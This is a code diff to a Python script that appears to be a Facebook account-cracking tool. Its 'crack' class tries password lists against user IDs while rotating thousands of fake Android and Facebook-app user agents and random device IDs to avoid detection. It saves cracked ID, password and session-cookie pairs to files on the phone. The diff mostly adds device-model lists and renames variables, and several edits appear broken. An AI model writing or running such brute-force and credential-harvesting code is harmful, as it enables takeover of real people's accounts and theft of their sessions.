@@ -175,7 +175,7 @@ for xd in range(5000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugenn.append(uaku2)
 
-ugen3=[]
+ugen33=[]
 for xd in range (50000):
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice (['8','9','10','11','12','13','14','15'])
@@ -186,7 +186,7 @@ for xd in range (50000):
 	g=random.randrange(20,190)
 	h='Mobile Safari/537.36'
 	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
-	ugen3. append(ua)
+	ugen33. append(ua)
 
 ok = []
 cp = []
@@ -273,10 +273,21 @@ d30 = random.choice(['LMK420Y','LM-V600VML','LM-K315','LM-Q725S','LM-K315','LMK5
 d31 = random.choice(['LMK520','Q710','LMV600VML','LM-X440ZM','LM-K610IM','LMK420H','LMK520, LM-K520','LM-Q610(FGN)','LMG910EMW','LM-K525'])
 vivo = random.choice(['vivo 1906','vivo 1938','vivo 1601','vivo 1920','vivo 1801','vivo 1935','vivo 1724','vivo 1901'])
 sony = random.choice(['XQ-BT44','XQ-AT52','XQ-BC52'])
-model1 = random.choice(['iQOO Z7 Pro','Realmi 7'])
+model1 = random.choice(['iQOO','Xiaomi'])
 model2 = random.choice(['Realme C55','Realme','Realme 9 pro+','Redmi A2+','OPPO Reno8 T','Realme narzo 50','Oppo A78','Redmi 12','Realme GT Neo 2','Redmi Note 12 Pro'])
 model3 = random.choice(['Xiaomi Redmi Note 11S','Vivo T2 Pro','Vivo V23e','Xiaomi Redmi Note 10 Pro','Xiaomi Poco X3 Pro','Oppo F17 Pro'])
 model4 = random.choice(['Infinix J582 Max','Realme 67','SM-S191ES','Mi X223 Max','Nokia NE312 Ultra','RMX7968','Nokia NJ590 Ultra','Honor 951 Max','Huawei S605P','SM-F696B','Nokia NP853 Ultra','Huawei 209T','Nokia Asha 331 Max','LG-591H','Redmi L305 Max','Redmi Note 626P','Redmi 538M','RMX1525','Sony Xperia P642 Pro','Oppo 964 Max','Nokia N412 Ultra','Infinix P643T','Sony Xperia 89Y','Honor Q219','Itel X559 Ultra','Sony Xperia 508T','Oppo K911T','Realme T250 Ultra','LM-R479G','Nokia NT419R','Realme H577T','Huawei Y446 Max','LM-27 Ultra','Vivo 190 Max','Itel W451J'])
+mixmodel = random.choice(['Acer','Alcatel','Allview','Amazon','Amoi','Apple','Archos','Asus','At&T','Benefon','Benq','Benq-siemens','Bird','Blackberry','Blackview','Blu','Bosch','Bq','Casio','Cat','Celkon','Chea','Coolpad','Cubot','Dell','Doogee','Emporia','Energizer','Ericsson','Eten','Fairphone','Fujitsu Siemens','Garmin-asus','Gigabyte','Gionee','Google','Haier','Honor','Hp','Htc','Huawei','I-mate','I-mobile','Icemobile','Infinix','Innostream','Inq','Intex','Itel','Jolla','Karbonn','Kyocera','Lava','Leeco','Lenovo','Lg','Maxon','Maxwest','Meizu','Micromax','Microsoft','Mitac','Mitsubishi','Modu','Motorola','Mwg','Nec','Neonode','Niu','Nokia','Nothing','Nvidia','O2','Oneplus','Oppo','Orange','Palm','Panasonic','Pantech','Parla','Philips','Plum','Posh','Prestigio','Qmobile','Qtek','Razer','Realme','Sagem','Samsung','Sendo','Sewon','Sharp','Siemens','Sonim','Sony','Sony Ericsson','Spice','T-mobile','Tcl','Tecno','Tel.Me.','Telit','Thuraya','Toshiba','Ulefone','Unnecto','Vertu','Verykool','Vivo','Vk Mobile','Vodafone','Wiko','Wnd','Xcute','Xiaomi','Xolo','Yezz','Yota','Yu','Zte'])
+
+modelname2 = random.choice(['iQOO Z7 Pro'])
+modelname1 = random.choice(['Doogee'])
+model121 = random.choice(['S110','S110','T10E','T20mini','T20S','T10S','N50','V30T','S100 Pro','V20 Pro','T30 Pro','X98 Pro','X98','S99','V Max','S100','V30','T20','T10','S96 GT'])
+
+
+
+
+
+
 #-----------------------------------------------------#
 kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
 
@@ -690,7 +701,7 @@ class crack:
         for pw in __juts__:
             try:
                 Mm = '\033[9;31m'
-                ua_string=random.choice(ugenn)
+                ua_string=random.choice(ugen)
                 application_version = str(random.randint(300,396))+'.0.0.'+str(random.randrange(10,49))+'.'+str(random.randint(111,396))
                 application_version_code=str(random.randint(000000000,999999999))
                 adid=str(uuid.uuid4())
@@ -830,7 +841,7 @@ class crack:
 
     def __mmb__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{PP}[M3] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} '),
+        sys.stdout.write(f'\r{HH}[M3] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} | CP:{len(cp)}{MM} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -844,7 +855,7 @@ class crack:
                 gtt = random.choice(sm)+b+str(''.join(random.choice(string.digits) for _ in range(random.choice(uo)))+str(random.choice(string.ascii_uppercase)))
                 gttt=str(random.choice(string.ascii_uppercase))+str(random.randrange(11,99))+str(''.join(random.choice(string.ascii_uppercase) for _ in range(random.choice(uo))))
                 net=random.choice(['ZONG', 'Jazz'])
-                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(FBMF)+;FBBD/+str(FBBD)+;FBPN/+str(FBPN)+;FBDV/+str(model3)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
+                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=+str(density)+,width=+str(width)+,height=+str(height)+};FBLC/+str(FBLC)+;FBRV/0;FBCR/+str(FBCR)+;FBMF/+str(fbmf)+;FBBD/+str(fbmf)+;FBPN/+str(FBPN)+;FBDV/+str(fbbd)+;FBSV/+str(FBSV)+;FBOP/+str(FBOP)+;FBDM/FBCA/+str(FBCA)+:]'
                 device = str(uuid.uuid4())
                 adid = str(uuid.uuid4())
                 data = {
@@ -912,7 +923,7 @@ class crack:
                         name=me['name']
                         idd=me['id']
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
-                        #print(f"\#r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
+                        #print(f"৳\{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
                         ok.append(used + pw)
